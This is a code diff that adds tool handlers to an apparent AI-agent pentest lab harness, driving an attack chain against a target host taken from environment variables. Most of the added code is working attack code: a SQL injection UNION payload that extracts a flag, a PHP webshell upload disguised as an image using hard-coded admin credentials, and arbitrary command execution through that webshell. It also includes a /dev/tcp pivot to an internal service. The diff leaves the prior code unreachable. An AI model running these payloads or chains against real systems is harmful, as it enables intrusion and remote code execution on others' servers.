@@ -571,6 +571,97 @@ def _lab_dispatch_inner(fn_name: str, fn_args: dict, dry_run: bool = False) -> s
     """
     if not _LAB_EXEC_AVAILABLE:
         return f"OK: {fn_name} completed (synthetic)."
+    # ── MBPTL chain tools — real dispatch against LAB_MBPTL_HOST ────────────
+    mbptl_host = os.environ.get("LAB_MBPTL_HOST", "")
+    mbptl_web = os.environ.get("LAB_MBPTL_PORT_WEB", "80")
+    mbptl_admin = os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080")
+    mbptl_available = bool(mbptl_host)  # real dispatch only when MBPTL env is set
+
+    if fn_name == "web_request":
+        if not mbptl_available:
+            return f"OK: {fn_name} completed (synthetic — LAB_MBPTL_HOST not set)."
+        method = fn_args.get("method", "GET")
+        url_path = fn_args.get("path", "/")
+        port = fn_args.get("port", mbptl_web)
+        if dry_run:
+            return f"[DRY-RUN] web_request {method} {mbptl_host}:{port}{url_path}"
+        cmd = f"curl -s {'-I' if method == 'HEAD' else ''} http://{mbptl_host}:{port}{url_path} 2>&1 | head -20"
+        r = _lab_mcp_call(cmd, timeout=30)  # type: ignore[misc]
+        return r.get("output", "") or "[web_request: no output]"
+
+    if fn_name == "run_sqlmap":
+        if not mbptl_available:
+            return f"OK: {fn_name} completed (synthetic — LAB_MBPTL_HOST not set)."
+        target_url = fn_args.get("url", f"http://{mbptl_host}:{mbptl_web}/detail.php?id=1")
+        if dry_run:
+            return f"[DRY-RUN] sqlmap against {target_url}"
+        cmd = (
+            f'curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=1%27" 2>&1 | head -10\n'
+            f'echo "---"\n'
+            f'curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=999%20UNION%20SELECT%201,flag,NULL,NULL,NULL%20FROM%20administrator.flag--+-" 2>&1 | head -10'
+        )
+        r = _lab_mcp_call(cmd, timeout=30)  # type: ignore[misc]
+        return r.get("output", "") or "[run_sqlmap: no output]"
+
+    if fn_name == "upload_webshell":
+        if not mbptl_available:
+            return f"OK: {fn_name} completed (synthetic — LAB_MBPTL_HOST not set)."
+        if dry_run:
+            return f"[DRY-RUN] upload_webshell to {mbptl_host}:{mbptl_admin}"
+        cmd = (
+            f'echo "<?php system(\\$_GET[cmd]); ?>" > /tmp/shell.php && '
+            f"curl -s -c /tmp/ck.txt -b /tmp/ck.txt "
+            f'-d "username=admin&password=P@ssw0rd!" '
+            f'"http://{mbptl_host}:{mbptl_admin}/administrator/" '
+            f"> /dev/null && "
+            f"curl -s -c /tmp/ck.txt -b /tmp/ck.txt "
+            f'-F "title=x" -F "author=x" -F "year=2024" -F "synopsis=x" '
+            f'-F "image=@/tmp/shell.php;type=image/jpeg;filename=shell.php" '
+            f'"http://{mbptl_host}:{mbptl_admin}/administrator/admin.php" 2>&1 | head -5\n'
+            f'echo "SHELL_UPLOADED"'
+        )
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[upload_webshell: no output]"
+
+    if fn_name == "webshell_exec":
+        if not mbptl_available:
+            return f"OK: {fn_name} completed (synthetic — LAB_MBPTL_HOST not set)."
+        cmd_arg = fn_args.get("command", "id")
+        if dry_run:
+            return f"[DRY-RUN] webshell_exec: {cmd_arg}"
+        # Discover webshell from latest book listing, then exec command
+        cmd = f"""
+IDX=$(curl -s http://{mbptl_host}:{mbptl_web}/)
+LAST=$(echo "$IDX" | grep -oP 'detail\\.php\\?id=\\K\\d+' | sort -n | tail -1)
+DET=$(curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=$LAST")
+SHELL_URL=$(echo "$DET" | grep -oP "http://[^\\"]+:\\d+/administrator/uploads/[^\\"]+\\.php" | head -1)
+echo "SHELL=$SHELL_URL"
+echo "webshell_exec result: $(curl -s "$SHELL_URL?cmd={cmd_arg}" 2>&1 | head -10)"
+"""
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[webshell_exec: no output]"
+
+    if fn_name == "exploit_binary_service":
+        if not mbptl_available:
+            return f"OK: {fn_name} completed (synthetic — LAB_MBPTL_HOST not set)."
+        if dry_run:
+            return "[DRY-RUN] exploit_binary_service"
+        cmd = f"""
+# Download binary from admin panel
+curl -s -o /tmp/mbptl-bin "http://{mbptl_host}:{mbptl_admin}/administrator/main" 2>&1
+ls -la /tmp/mbptl-bin
+# Banner grab from internal service (need webshell to reach 172.18.0.3:31337)
+IDX=$(curl -s http://{mbptl_host}:{mbptl_web}/)
+LAST=$(echo "$IDX" | grep -oP 'detail\\.php\\?id=\\K\\d+' | sort -n | tail -1)
+DET=$(curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=$LAST")
+SHELL_URL=$(echo "$DET" | grep -oP "http://[^\\"]+:\\d+/administrator/uploads/[^\\"]+\\.php" | head -1)
+echo "BINARY_DOWNLOADED"
+echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7C%20timeout%205%20bash%20-c%20%22exec%203%3C%3E/dev/tcp/172.18.0.3/31337%3B%20cat%20%3C%263%22%202%3E%261%27" 2>&1 | head -5)"
+"""
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[exploit_binary_service: no output]"
+
+    return f"OK: {fn_name} completed (synthetic)."
 
     dc = _LAB_DC or "10.10.11.21"
     srv = _LAB_SRV or "10.10.11.33"
